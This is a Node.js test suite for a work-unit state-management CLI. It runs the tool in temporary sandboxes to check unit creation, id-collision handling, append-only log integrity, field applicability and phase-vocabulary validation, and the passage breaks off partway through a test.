// node --test suite for work-unit.mjs (Schema 2.0): every accept path and each rejection
// class of the work-unit-state contract, driven through the CLI. The graph is the golden
// flattened coding-factory (scripts/fixtures); the type catalogs are the shipped plugin
// catalog plus a tmp project catalog holding the instantiated `phase` type.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { CORE_STATE_FIELDS, PLUGIN_CATALOG, instantiate } from './types.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SCRIPT = path.join(HERE, 'work-unit.mjs');
const FIXTURES = path.join(HERE, 'fixtures');

// ---------------------------------------------------------------------------
// fixtures

const readJson = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));
const clone = (v) => JSON.parse(JSON.stringify(v));
const GOLDEN = readJson(path.join(FIXTURES, 'coding-factory.graph.json'));
const SLOTS = readJson(path.join(FIXTURES, 'coding-factory.slots.json'));
const SHIPPED = readJson(PLUGIN_CATALOG);
const PHASE = instantiate(SHIPPED.phase, SLOTS).entry;

const T0 = '2099-01-01T00:00:00Z'; // after any real clock, so created_at <= updated_at holds
let counter = 0;
const TMP = [];
process.on('exit', () => { for (const d of TMP) fs.rmSync(d, { recursive: true, force: true }); });

function mkdtemp(prefix) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  TMP.push(dir);
  return dir;
}

function paths(dir) {
  return {
    dir: dir,
    graph: path.join(dir, 'graph.json'),
    types: path.join(dir, 'types.json'),
    units: path.join(dir, 'units'),
    archive: path.join(dir, 'units', 'archive'),
  };
}

// A project sandbox: the golden graph (optionally mutated) and a project catalog holding the
// instantiated phase type plus any extra entries.
function sandbox(opts) {
  const o = opts || {};
  const sb = paths(mkdtemp('wu-test-'));
  const graph = clone(GOLDEN);
  if (o.graph) o.graph(graph);
  fs.writeFileSync(sb.graph, JSON.stringify(graph));
  fs.writeFileSync(sb.types, JSON.stringify(Object.assign({ phase: PHASE }, o.types || {})));
  return sb;
}

function copyDir(from, to) {
  fs.mkdirSync(to, { recursive: true });
  for (const e of fs.readdirSync(from, { withFileTypes: true })) {
    const a = path.join(from, e.name);
    const b = path.join(to, e.name);
    if (e.isDirectory()) copyDir(a, b);
    else fs.copyFileSync(a, b);
  }
}

// Expensive scenario setups run once through the real gate and are copied per test.
const bases = {};
function fork(key, build) {
  if (!bases[key]) {
    const sb = sandbox();
    build(sb, 'base');
    bases[key] = sb;
  }
  const dir = mkdtemp('wu-fork-');
  copyDir(bases[key].dir, dir);
  return { sb: paths(dir), id: 'base' };
}

function cli(args, opts) {
  const o = opts || {};
  const r = spawnSync(process.execPath, [SCRIPT].concat(args), { encoding: 'utf8', cwd: o.cwd || process.cwd(), env: o.env || process.env });
  let json;
  try { json = JSON.parse(r.stdout); } catch (_) { json = null; }
  return { code: r.status, json: json, stdout: r.stdout, stderr: r.stderr };
}

const gflags = (sb) => ['--graph', sb.graph, '--types', sb.types];

function create(sb, id, source, extra) {
  const args = ['create'].concat(gflags(sb), ['--units', sb.units, '--id', id, '--source', source || 'prompt', '--request', 'do the thing', '--remote', 'none']);
  return cli(args.concat(extra || []));
}

function readState(sb, id) {
  return JSON.parse(fs.readFileSync(path.join(sb.units, id, 'state.json'), 'utf8'));
}

function unitDir(sb, id) {
  return path.join(sb.units, id);
}

const SOURCES = { create: 'orchestrator', dispatch: 'orchestrator', route: 'orchestrator', step: 'orchestrator', archive: 'orchestrator', report: 'actor-report', verdict: 'actor-report', 'advisor-consultation': 'actor-report', 'human-decision': 'human-answer' };

// Log lines numbered from the stored log; `node` defaults to the draft's current node.
function nextLines(sb, id, specs, defaultNode) {
  const text = fs.readFileSync(path.join(unitDir(sb, id), 'log.ndjson'), 'utf8');
  let n = text.split('\n').filter(Boolean).length;
  return specs.map(function (s) {
    n += 1;
    const type = s.event_type || 'route';
    const src = SOURCES[type];
    return Object.assign({
      id: 'L-' + String(n).padStart(4, '0'),
      timestamp: s.timestamp || T0,
      source: src,
      actor: src === 'actor-report' ? 'reviewer' : null,
      node: defaultNode,
      event_type: type,
      description: 'event',
      source_ref: src === 'orchestrator' ? null : 'research/decision-1.md',
    }, s);
  });
}

function put(sb, id, rel, content) {
  const f = path.join(unitDir(sb, id), rel);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, content || 'x\n');
}

function snapshot(dir) {
  const out = {};
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) walk(p);
      else out[p] = fs.readFileSync(p, 'utf8');
    }
  })(dir);
  return out;
}

// write(): the draft is built by `mutate(state)`; the new log lines by `specs`.
function write(sb, id, mutate, specs) {
  const state = readState(sb, id);
  mutate(state);
  state.updated_at = (specs && specs.length && specs[specs.length - 1].timestamp) || T0;
  const draft = path.join(sb.dir, 'draft-' + (counter++) + '.json');
  const log = path.join(sb.dir, 'log-' + (counter++) + '.json');
  fs.writeFileSync(draft, JSON.stringify(state));
  fs.writeFileSync(log, JSON.stringify(nextLines(sb, id, specs || [{}], state.current_node)));
  return cli(['write'].concat(gflags(sb), ['--unit', unitDir(sb, id), '--state', draft, '--log', log]));
}

function rules(r) {
  return ((r.json && r.json.violations) || []).map(function (x) { return x.rule; });
}

function messages(r, rule) {
  return ((r.json && r.json.violations) || []).filter(function (x) { return x.rule === rule; }).map(function (x) { return x.message; });
}

function assertRejected(r, rule) {
  assert.equal(r.code, 3, r.stdout);
  assert.equal(r.json.ok, false);
  assert.equal(r.json.error, 'state');
  assert.ok(rules(r).indexOf(rule) !== -1, 'expected rule ' + rule + ', got ' + JSON.stringify(rules(r)));
}

function ok(r) {
  assert.equal(r.code, 0, r.stdout);
  return r;
}

function rejectsAtomically(sb, id, mutate, specs, rule) {
  const before = snapshot(unitDir(sb, id));
  const r = write(sb, id, mutate, specs);
  assertRejected(r, rule);
  assert.deepEqual(snapshot(unitDir(sb, id)), before, 'a rejected draft must write nothing');
  return r;
}

// ---------------------------------------------------------------------------
// scenario steps (each goes through the real gate)

const T = (id, cmd, over) => Object.assign({ id: id, status: 'pending', verification_command: cmd || 'npm test -- ' + id.toLowerCase(), evidence_refs: [] }, over || {});

// Routing into a node: the node joins walked_path and the pipeline position names its task.
function routeTo(sb, id, node, task, extra) {
  return write(sb, id, (s) => {
    s.current_node = node;
    s.walked_path.push(node);
    s.current_task = task;
    if (extra) extra(s);
  }, [{ event_type: 'route' }]);
}

// Advancing the pipeline position inside the current node.
function dispatch(sb, id, task, extra) {
  return write(sb, id, (s) => { s.current_task = task; if (extra) extra(s); }, [{ event_type: 'dispatch' }]);
}

function approvalDecision(phase, n) {
  return { id: 'H-' + (n || 1), kind: 'approval', node: 'research', decision: 'approved', phase: phase, target: null, file: 'research/decision-' + (n || 1) + '.md', date: T0 };
}

// create -> research (research-request) -> approve-phase in flight -> phase recorded.
function approved(sb, id, phase, source) {
  ok(create(sb, id, source || 'prompt'));
  const r = ok(routeTo(sb, id, 'research', 'research-request'));
  assert.deepEqual(r.json.materialized, ['contract_ref']);
  ok(dispatch(sb, id, 'approve-phase'));
  put(sb, id, 'research/decision-1.md', 'approved\n');
  ok(write(sb, id, (s) => {
    s.phase = phase;
    s.human_decisions.push(approvalDecision(phase));
  }, [{ event_type: 'human-decision' }]));
}

// fix unit at the ticket node with decompose-tickets in flight (ticket fields materialized).
function atTicket(sb, id) {
  approved(sb, id, 'fix');
  const r = ok(routeTo(sb, id, 'ticket', 'decompose-tickets'));
  assert.deepEqual(r.json.materialized.sort(), ['current_ticket', 'pending_tickets', 'tickets']);
}

// ... with T-1 and T-2 decomposed, nothing selected yet.
function decomposed(sb, id) {
  atTicket(sb, id);
  ok(write(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2')]; s.pending_tickets = ['T-1', 'T-2']; }, [{ event_type: 'report' }]));
}

// ... T-1 selected through the bookkeeping step, no task in flight.
function selected(sb, id) {
  decomposed(sb, id);
  ok(dispatch(sb, id, null));
  ok(write(sb, id, (s) => { s.pending_tickets = ['T-2']; s.current_ticket = 'T-1'; }, [{ event_type: 'route' }]));
}

// ... routed into build with verify-build in flight.
function atBuild(sb, id) {
  selected(sb, id);
  ok(routeTo(sb, id, 'build', 'provision-worktree'));
  ok(dispatch(sb, id, 'verify-build'));
}

// feat unit at the spec node with author-contract in flight.
function atSpec(sb, id) {
  approved(sb, id, 'feat');
  ok(routeTo(sb, id, 'spec', 'author-contract'));
}

// chore unit at build-direct with verify-build in flight (no ticket concept).
function atBuildDirect(sb, id) {
  approved(sb, id, 'chore');
  ok(routeTo(sb, id, 'build-direct', 'provision-worktree'));
  ok(dispatch(sb, id, 'verify-build'));
}

const forkTicket = () => fork('atTicket', atTicket);
const forkDecomposed = () => fork('decomposed', decomposed);
const forkSelected = () => fork('selected', selected);
const forkBuild = () => fork('atBuild', atBuild);
const forkSpec = () => fork('atSpec', atSpec);
const forkBuildDirect = () => fork('atBuildDirect', atBuildDirect);

// ---------------------------------------------------------------------------
// output contract, usage

test('--help prints one JSON object and exits 0', () => {
  const r = cli(['--help']);
  assert.equal(r.code, 0);
  assert.equal(r.json.ok, true);
  assert.equal(r.json.action, 'help');
  assert.equal(r.stdout.trim().split('\n').length, 1);
  assert.deepEqual(r.json.subcommands, ['create', 'validate', 'write', 'archive', 'land-tests', 'expect-red']);
});

test('unknown subcommand and missing flags exit 2 with a usage error', () => {
  assert.equal(cli(['frobnicate']).json.error, 'usage');
  const r = cli(['validate']);
  assert.equal(r.code, 2);
  assert.equal(r.json.error, 'usage');
  assert.equal(cli(['validate', '--graph', 'g', '--graph', 'h']).code, 2);
  assert.equal(cli(['land-tests', '--graph', 'g', '--unit', 'u', '--ticket', 'T-1']).code, 2); // no --worktree
  assert.equal(cli(['expect-red', '--graph', 'g', '--unit', 'u', '--worktree', 'w']).code, 2); // no --ticket
  assert.equal(cli(['validate', '--graph', 'g', '--unit', 'u', '--bogus', 'x']).code, 2);
});

test('missing graph file exits 5, a non-2.0 or invalid graph exits 8', () => {
  const sb = sandbox();
  assert.equal(cli(['validate', '--graph', path.join(sb.dir, 'nope.json'), '--types', sb.types, '--unit', sb.dir]).code, 5);
  const bad = path.join(sb.dir, 'bad.json');
  fs.writeFileSync(bad, JSON.stringify({ nodes: [] }));
  const r = cli(['validate', '--graph', bad, '--types', sb.types, '--unit', sb.dir]);
  assert.equal(r.code, 8);
  assert.equal(r.json.error, 'graph');
  const junk = path.join(sb.dir, 'junk.json');
  fs.writeFileSync(junk, '{nope');
  assert.equal(cli(['validate', '--graph', junk, '--types', sb.types, '--unit', sb.dir]).code, 8);
});

// ---------------------------------------------------------------------------
// the gate never backs a unit with a definition the validator rejects

test('a definition the validator rejects exits 8 on every subcommand, naming the validator codes', () => {
  const cases = [
    ['1.x schema version', { graph: (g) => { g.schema_version = '1.0.0'; } }, 'SCHEMA_VERSION_UNSUPPORTED'],
    ['missing cap', { graph: (g) => { delete g.caps.edge_revisit; } }, 'CAP_MISSING'],
    ['unfilled phase type', { types: null }, 'TYPE_PARAMETERIZED_UNFILLED'],
  ];
  for (const [label, opts, code] of cases) {
    const sb = sandbox(opts.graph ? { graph: opts.graph } : {});
    if (opts.types === null) fs.writeFileSync(sb.types, '{}');
    const make = cli(['create'].concat(gflags(sb), ['--units', sb.units, '--id', 'g1', '--source', 'prompt', '--request', 'r', '--remote', 'none']));
    assert.equal(make.code, 8, label + ': ' + make.stdout);
    assert.equal(make.json.error, 'graph');
    assert.ok(rules(make).indexOf(code) !== -1, label + ': expected ' + code + ', got ' + JSON.stringify(rules(make)));
    assert.equal(fs.existsSync(unitDir(sb, 'g1')), false, 'nothing is created for a rejected definition');
    for (const sub of [['validate', '--unit', sb.dir], ['write', '--unit', sb.dir, '--state', 's', '--log', 'l'], ['archive', '--unit', sb.dir], ['land-tests', '--unit', sb.dir, '--worktree', sb.dir, '--ticket', 'T-1'], ['expect-red', '--unit', sb.dir, '--worktree', sb.dir, '--ticket', 'T-1']]) {
      const r = cli([sub[0]].concat(gflags(sb), sub.slice(1)));
      assert.equal(r.code, 8, label + ' ' + sub[0] + ': ' + r.stdout);
      assert.equal(r.json.error, 'graph');
    }
  }
});

test('catalog errors are graph failures naming them; --plugin-types and --types select the catalogs', () => {
  const sb = sandbox();
  // an unreadable plugin catalog
  const r = cli(['validate', '--graph', sb.graph, '--types', sb.types, '--plugin-types', path.join(sb.dir, 'missing.json'), '--unit', sb.dir]);
  assert.equal(r.code, 8);
  assert.ok(rules(r).indexOf('CATALOG_UNREADABLE') !== -1, JSON.stringify(rules(r)));
  // a project entry colliding with a plain plugin entry
  fs.writeFileSync(sb.types, JSON.stringify({ phase: PHASE, tickets: { type: 'list', default: [] } }));
  const c = cli(['validate', '--graph', sb.graph, '--types', sb.types, '--unit', sb.dir]);
  assert.equal(c.code, 8);
  assert.ok(rules(c).indexOf('TYPE_COLLISION') !== -1, JSON.stringify(rules(c)));
  assert.match(c.json.message, /TYPE_COLLISION/);
});

test('--types and --plugin-types default to .harness/types.json under the cwd and the shipped plugin catalog', () => {
  const sb = sandbox();
  const proj = mkdtemp('wu-proj-');
  fs.mkdirSync(path.join(proj, '.harness'));
  fs.copyFileSync(sb.graph, path.join(proj, '.harness', 'graph.json'));
  fs.copyFileSync(sb.types, path.join(proj, '.harness', 'types.json'));
  const r = cli(['create', '--graph', '.harness/graph.json', '--units', 'units', '--id', 'dflt', '--source', 'prompt', '--request', 'r', '--remote', 'none'], { cwd: proj });
  assert.equal(r.code, 0, r.stdout);
  assert.ok(fs.existsSync(path.join(proj, 'units', 'dflt', 'state.json')));
  // without the project catalog the phase type is unfilled
  fs.rmSync(path.join(proj, '.harness', 'types.json'));
  const bad = cli(['create', '--graph', '.harness/graph.json', '--units', 'units', '--id', 'dflt2', '--source', 'prompt', '--request', 'r', '--remote', 'none'], { cwd: proj });
  assert.equal(bad.code, 8);
  assert.ok(rules(bad).indexOf('TYPE_PARAMETERIZED_UNFILLED') !== -1);
});

// ---------------------------------------------------------------------------
// create

test('create writes a core-only unit at the entry node, materializes nothing, and validates', () => {
  const sb = sandbox();
  const r = create(sb, 'csv-export');
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.action, 'created');
  assert.deepEqual(r.json.materialized, []);
  const s = readState(sb, 'csv-export');
  assert.equal(s.schema_version, '2.0.0');
  assert.equal(s.current_node, 'trigger');
  assert.equal(s.current_task, null);
  assert.equal(s.phase, null);
  assert.deepEqual(s.walked_path, ['trigger']);
  for (const f of ['tickets', 'pending_tickets', 'current_ticket', 'contract_ref']) assert.equal(f in s, false, f + ' waits for its producing node');
  assert.deepEqual(Object.keys(s).sort(), CORE_STATE_FIELDS.slice().sort(), 'a created unit holds exactly the shared core list');
  assert.equal(s.trigger.source, 'prompt');
  assert.equal(s.trigger.request, 'do the thing');
  const v = cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, 'csv-export')]));
  assert.equal(v.code, 0, v.stdout);
  assert.equal(v.json.log_lines, 1);
});

test('create records an optional target branch', () => {
  const sb = sandbox();
  assert.equal(create(sb, 'fix-1', 'ci-failure', ['--branch', 'wu/old']).code, 0);
  assert.equal(readState(sb, 'fix-1').trigger.branch, 'wu/old');
});

test('create rejects an id outside the grammar and an unknown source', () => {
  const sb = sandbox();
  assert.equal(create(sb, 'Bad_Id').code, 2);
  assert.equal(create(sb, '-lead').code, 2);
  assert.equal(create(sb, 'ok', 'analysis-request').code, 2);
});

test('create rejects an id colliding with a live unit', () => {
  const sb = sandbox();
  assert.equal(create(sb, 'dup').code, 0);
  const r = create(sb, 'dup');
  assert.equal(r.code, 9);
  assert.equal(r.json.error, 'id_collision');
  assert.equal(r.json.collision, 'work-units');
});

test('create rejects an id colliding with the archive (dir and md)', () => {
  const sb = sandbox();
  fs.mkdirSync(path.join(sb.archive, 'old-unit'), { recursive: true });
  fs.writeFileSync(path.join(sb.archive, 'legacy.md'), 'x');
  const a = create(sb, 'old-unit');
  assert.equal(a.code, 9);
  assert.equal(a.json.collision, 'archive');
  assert.equal(create(sb, 'legacy').code, 9);
});

test('create rejects an id colliding with a remote wu/<id> branch', () => {
  const sb = sandbox();
  const bare = path.join(sb.dir, 'remote.git');
  const work = path.join(sb.dir, 'work');
  const env = { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' };
  const g = (cwd, args) => spawnSync('git', args, { cwd: cwd, env: env, encoding: 'utf8' });
  fs.mkdirSync(work);
  g(sb.dir, ['init', '--bare', bare]);
  g(work, ['init']);
  g(work, ['commit', '--allow-empty', '-m', 'init']);
  g(work, ['push', bare, 'HEAD:refs/heads/wu/taken']);
  const hit = create(sb, 'taken', 'prompt', []);
  assert.equal(hit.code, 0, 'remote none by default in helper');
  fs.rmSync(unitDir(sb, 'taken'), { recursive: true });
  const args = ['create'].concat(gflags(sb), ['--units', sb.units, '--id', 'taken', '--source', 'prompt', '--request', 'r', '--remote', bare]);
  const r = cli(args);
  assert.equal(r.code, 9, r.stdout);
  assert.equal(r.json.collision, 'remote');
  const free = cli(args.map((a) => (a === 'taken' ? 'free' : a)));
  assert.equal(free.code, 0, free.stdout);
  assert.equal(free.json.remote_checked, true);
});

test('create fails closed when the remote cannot be queried', () => {
  const sb = sandbox();
  const r = cli(['create'].concat(gflags(sb), ['--units', sb.units, '--id', 'x1', '--source', 'prompt', '--request', 'r', '--remote', path.join(sb.dir, 'missing.git')]));
  assert.equal(r.code, 10);
  assert.equal(r.json.error, 'remote_unreachable');
  assert.equal(fs.existsSync(unitDir(sb, 'x1')), false);
});

// ---------------------------------------------------------------------------
// write: accept paths, applicability, materialization

test('routing into research materializes contract_ref; ticket fields wait for their node', () => {
  const sb = sandbox();
  create(sb, 'a1');
  const r = ok(routeTo(sb, 'a1', 'research', 'research-request'));
  assert.deepEqual(r.json.materialized, ['contract_ref']);
  const s = readState(sb, 'a1');
  assert.equal(s.contract_ref, null);
  assert.equal(s.current_task, 'research-request');
  assert.equal('tickets' in s, false);
  assert.equal('pending_tickets' in s, false);
  assert.equal('current_ticket' in s, false);
});

test('a ticket-node unit materializes tickets, pending_tickets and current_ticket with catalog defaults', () => {
  const { sb, id } = forkTicket();
  const s = readState(sb, id);
  assert.deepEqual(s.tickets, []);
  assert.deepEqual(s.pending_tickets, []);
  assert.equal(s.current_ticket, null);
  ok(cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, id)])));
});

test('a chore unit never carries ticket fields: field-inapplicable', () => {
  const { sb, id } = forkBuildDirect();
  assert.equal('tickets' in readState(sb, id), false);
  rejectsAtomically(sb, id, (s) => { s.tickets = []; }, [{}], 'field-inapplicable');
  rejectsAtomically(sb, id, (s) => { s.current_ticket = null; }, [{}], 'field-inapplicable');
});

test('an applicable field cannot go missing: field-missing', () => {
  const { sb, id } = forkTicket();
  rejectsAtomically(sb, id, (s) => { delete s.tickets; }, [{}], 'field-missing');
  rejectsAtomically(sb, id, (s) => { delete s.contract_ref; }, [{}], 'field-missing');
});

test('step is a valid orchestrator log event', () => {
  const sb = sandbox();
  create(sb, 's1');
  ok(write(sb, 's1', (s) => { s.current_node = 'research'; s.walked_path.push('research'); s.current_task = 'research-request'; },
    [{ event_type: 'step', description: 'npm test exit 1 | tail: 1 failing' }, { event_type: 'route' }]));
});

test('write accepts a log-full draft whose prefix is the stored log', () => {
  const sb = sandbox();
  create(sb, 'f1');
  const state = readState(sb, 'f1');
  state.current_node = 'research';
  state.walked_path.push('research');
  state.contract_ref = null;
  const stored = fs.readFileSync(path.join(unitDir(sb, 'f1'), 'log.ndjson'), 'utf8');
  const line = nextLines(sb, 'f1', [{ event_type: 'route' }], 'research')[0];
  state.updated_at = line.timestamp;
  fs.writeFileSync(path.join(sb.dir, 's.json'), JSON.stringify(state));
  fs.writeFileSync(path.join(sb.dir, 'l.ndjson'), stored + JSON.stringify(line) + '\n');
  const r = cli(['write'].concat(gflags(sb), ['--unit', unitDir(sb, 'f1'), '--state', path.join(sb.dir, 's.json'), '--log-full', path.join(sb.dir, 'l.ndjson')]));
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.appended, 1);
});

test('write requires exactly one of --log and --log-full', () => {
  const sb = sandbox();
  create(sb, 'f2');
  const r = cli(['write'].concat(gflags(sb), ['--unit', unitDir(sb, 'f2'), '--state', 'x']));
  assert.equal(r.code, 2);
});

// ---------------------------------------------------------------------------
// write: rejection classes (each also proves nothing was written)

test('log tampering: modified existing line is rejected (byte-prefix)', () => {
  const sb = sandbox();
  create(sb, 't1');
  const dir = unitDir(sb, 't1');
  const stored = fs.readFileSync(path.join(dir, 'log.ndjson'), 'utf8');
  const tampered = stored.replace('Created', 'Edited') + JSON.stringify(nextLines(sb, 't1', [{}], 'trigger')[0]) + '\n';
  fs.writeFileSync(path.join(sb.dir, 'l.ndjson'), tampered);
  fs.writeFileSync(path.join(sb.dir, 's.json'), JSON.stringify(readState(sb, 't1')));
  const before = snapshot(dir);
  const r = cli(['write'].concat(gflags(sb), ['--unit', dir, '--state', path.join(sb.dir, 's.json'), '--log-full', path.join(sb.dir, 'l.ndjson')]));
  assertRejected(r, 'log-not-prefix');
  assert.deepEqual(snapshot(dir), before);
});

test('log tampering: deleting an existing line is rejected', () => {
  const { sb, id } = forkBuildDirect();
  const dir = unitDir(sb, id);
  const lines = fs.readFileSync(path.join(dir, 'log.ndjson'), 'utf8').split('\n').filter(Boolean);
  fs.writeFileSync(path.join(sb.dir, 'l.ndjson'), lines.slice(1).join('\n') + '\n');
  fs.writeFileSync(path.join(sb.dir, 's.json'), JSON.stringify(readState(sb, id)));
  const r = cli(['write'].concat(gflags(sb), ['--unit', dir, '--state', path.join(sb.dir, 's.json'), '--log-full', path.join(sb.dir, 'l.ndjson')]));
  assertRejected(r, 'log-not-prefix');
});

test('a state change without a new log line is rejected', () => {
  const sb = sandbox();
  create(sb, 'n1');
  const state = readState(sb, 'n1');
  state.current_node = 'research';
  fs.writeFileSync(path.join(sb.dir, 's.json'), JSON.stringify(state));
  fs.writeFileSync(path.join(sb.dir, 'l.json'), '[]');
  const r = cli(['write'].concat(gflags(sb), ['--unit', unitDir(sb, 'n1'), '--state', path.join(sb.dir, 's.json'), '--log', path.join(sb.dir, 'l.json')]));
  assertRejected(r, 'no-log-line');
});

test('log ids must strictly increase', () => {
  const sb = sandbox();
  create(sb, 'i1');
  rejectsAtomically(sb, 'i1', (s) => { s.walked_path.push('research'); s.current_node = 'research'; s.contract_ref = null; }, [{ id: 'L-0001', event_type: 'route' }], 'log-ids-not-increasing');
});

test('log timestamps must not decrease', () => {
  const sb = sandbox();
  create(sb, 'i2');
  rejectsAtomically(sb, 'i2', (s) => { s.walked_path.push('research'); s.current_node = 'research'; s.contract_ref = null; }, [{ event_type: 'route', timestamp: '2000-01-01T00:00:00Z' }], 'log-timestamps-decrease');
});

test('updated_at must equal the newest log timestamp', () => {
  const sb = sandbox();
  create(sb, 'u1');
  const state = readState(sb, 'u1');
  state.current_node = 'research';
  state.updated_at = '2030-01-01T00:00:00Z';
  fs.writeFileSync(path.join(sb.dir, 's.json'), JSON.stringify(state));
  fs.writeFileSync(path.join(sb.dir, 'l.json'), JSON.stringify(nextLines(sb, 'u1', [{ event_type: 'route' }], 'research')));
  const r = cli(['write'].concat(gflags(sb), ['--unit', unitDir(sb, 'u1'), '--state', path.join(sb.dir, 's.json'), '--log', path.join(sb.dir, 'l.json')]));
  assertRejected(r, 'updated-at-mismatch');
});

test('log line schema: wrong source for the event type, undeclared node', () => {
  const sb = sandbox();
  create(sb, 'l1');
  const move = (s) => { s.current_node = 'research'; s.walked_path.push('research'); s.contract_ref = null; };
  rejectsAtomically(sb, 'l1', move, [{ event_type: 'route', source: 'human-answer', source_ref: 'research/decision-1.md' }], 'log-line-invalid');
  rejectsAtomically(sb, 'l1', move, [{ event_type: 'route', node: 'ghost' }], 'log-line-invalid');
});

test('immutable identity: schema_version, id, created_at, trigger cannot change', () => {
  const sb = sandbox();
  create(sb, 'm1');
  rejectsAtomically(sb, 'm1', (s) => { s.created_at = '2020-01-01T00:00:00Z'; }, [{}], 'identity-changed');
  rejectsAtomically(sb, 'm1', (s) => { s.trigger.request = 'something else'; }, [{}], 'identity-changed');
  rejectsAtomically(sb, 'm1', (s) => { s.trigger.source = 'issue'; }, [{}], 'identity-changed');
  rejectsAtomically(sb, 'm1', (s) => { s.id = 'other'; }, [{}], 'identity-changed');
  rejectsAtomically(sb, 'm1', (s) => { s.schema_version = '1.0.0'; }, [{}], 'identity-changed');
});

test('undeclared top-level fields are rejected, and so is a field of the 1.x core', () => {
  const sb = sandbox();
  create(sb, 'x2');
  rejectsAtomically(sb, 'x2', (s) => { s.mystery = 1; }, [{}], 'undeclared-field');
});

test('a stored 1.x state is rejected by validate (schema_version 2.0.0 only)', () => {
  const sb = sandbox();
  create(sb, 'old1');
  const f = path.join(unitDir(sb, 'old1'), 'state.json');
  const s = readJson(f);
  s.schema_version = '1.0.0';
  delete s.current_task;
  fs.writeFileSync(f, JSON.stringify(s));
  const r = cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, 'old1')]));
  assertRejected(r, 'state-invalid');
  assert.ok(messages(r, 'state-invalid').some((m) => /schema_version/.test(m)));
  assert.ok(messages(r, 'state-invalid').some((m) => /current_task/.test(m)));
});

test('walked_path is append-only and holds declared nodes', () => {
  const { sb, id } = forkBuildDirect();
  rejectsAtomically(sb, id, (s) => { s.walked_path = ['research']; }, [{}], 'walked-path-rewritten');
  rejectsAtomically(sb, id, (s) => { s.walked_path.push('ghost'); }, [{}], 'node-undeclared');
});

test('current_node must be declared; there are no phase paths to leave (no node-off-path rule)', () => {
  const { sb, id } = forkBuildDirect();
  rejectsAtomically(sb, id, (s) => { s.current_node = 'ghost'; }, [{}], 'node-undeclared');
  // a chore unit may be routed anywhere the orchestrator's declared edges lead; the gate has no path table
  ok(write(sb, id, (s) => { s.current_node = 'review'; s.walked_path.push('review'); s.current_task = 'review-change'; }, [{}]));
});

// ---------------------------------------------------------------------------
// current_task: the pipeline position

test('current_task is null or a task of the current node pipeline', () => {
  const { sb, id } = forkTicket();
  rejectsAtomically(sb, id, (s) => { s.current_task = 'verify-build'; }, [{}], 'task-invalid'); // a real task, but not in ticket's pipeline
  rejectsAtomically(sb, id, (s) => { s.current_task = 'no-such-task'; }, [{}], 'task-invalid');
  rejectsAtomically(sb, id, (s) => { s.current_task = 7; }, [{}], 'task-invalid');
  ok(write(sb, id, (s) => { s.current_task = null; }, [{}]));
  ok(write(sb, id, (s) => { s.current_task = 'decompose-tickets'; }, [{}]));
});

test('current_task moves with the node: a stale task from the old node is invalid', () => {
  const { sb, id } = forkBuildDirect();
  // verify-build is in build-direct's pipeline but not in review's
  rejectsAtomically(sb, id, (s) => { s.current_node = 'review'; s.walked_path.push('review'); }, [{}], 'task-invalid');
});

test('the entry node has no pipeline, so no task may be in flight there', () => {
  const sb = sandbox();
  create(sb, 'e1');
  rejectsAtomically(sb, 'e1', (s) => { s.current_task = 'approve-phase'; }, [{}], 'task-invalid');
});

test('a terminal pipeline task may be in flight at the terminal', () => {
  const { sb, id } = forkBuildDirect();
  ok(routeTo(sb, id, 'review', 'review-change'));
  ok(routeTo(sb, id, 'wrap', 'close-out'));
  ok(write(sb, id, (s) => { s.current_node = 'ship'; s.walked_path.push('ship'); s.current_task = 'archive-shipped'; s.outcome = 'shipped'; }, [{}]));
});

// ---------------------------------------------------------------------------
// phase

const STATE_PHASE_MSG = /^phase must be null or a value of the instantiated phase type: feat, fix, chore, maintenance$/;
const DECISION_PHASE_MSG = /human_decisions\[\d+\]\.phase must be a declared phase/;

test('phase must come from the instantiated phase vocabulary', () => {
  const sb = sandbox();
  create(sb, 'p1');
  ok(routeTo(sb, 'p1', 'research', 'approve-phase'));
  put(sb, 'p1', 'research/decision-1.md');
  // both the state-level and the decision-level vocabulary checks fire here
  const r = rejectsAtomically(sb, 'p1', (s) => {
    s.phase = 'docs';
    s.human_decisions.push(approvalDecision('docs'));
  }, [{ event_type: 'human-decision' }], 'phase-undeclared');
  const msgs = messages(r, 'phase-undeclared');
  assert.ok(msgs.some((m) => STATE_PHASE_MSG.test(m)), JSON.stringify(msgs));
  assert.ok(msgs.some((m) => DECISION_PHASE_MSG.test(m)), JSON.stringify(msgs));
});

// The state-level check, alone: the approval decision records a valid phase, so the
// decision-level check cannot raise the rule and mask it.
test('the state-level phase vocabulary check stands on its own', () => {
  const sb = sandbox();
  create(sb, 'p1b');
  ok(routeTo(sb, 'p1b', 'research', 'approve-phase'));
  put(sb, 'p1b', 'research/decision-1.md');
  // an undeclared state phase next to a decision recording a valid one
  const r = rejectsAtomically(sb, 'p1b', (s) => {
    s.phase = 'docs';
    s.human_decisions.push(approvalDecision('chore'));
  }, [{ event_type: 'human-decision' }], 'phase-undeclared');
  const msgs = messages(r, 'phase-undeclared');
  assert.equal(msgs.length, 1, JSON.stringify(msgs));
  assert.match(msgs[0], STATE_PHASE_MSG);
  assert.ok(!msgs.some((m) => DECISION_PHASE_MSG.test(m)), 'the decision-level check did not raise it');
  // a non-string phase is the same state-level violation
  const n = rejectsAtomically(sb, 'p1b', (s) => { s.phase = 7; }, [{}], 'phase-undeclared');
  assert.deepEqual(messages(n, 'phase-undeclared').filter((m) => !STATE_PHASE_MSG.test(m)), []);
  // and a forged stored state is caught by validate with no write involved
  const f = path.join(unitDir(sb, 'p1b'), 'state.json');
  const st = readJson(f);
  st.phase = 'docs';
  st.human_decisions.push(approvalDecision('chore'));
  fs.writeFileSync(f, JSON.stringify(st));
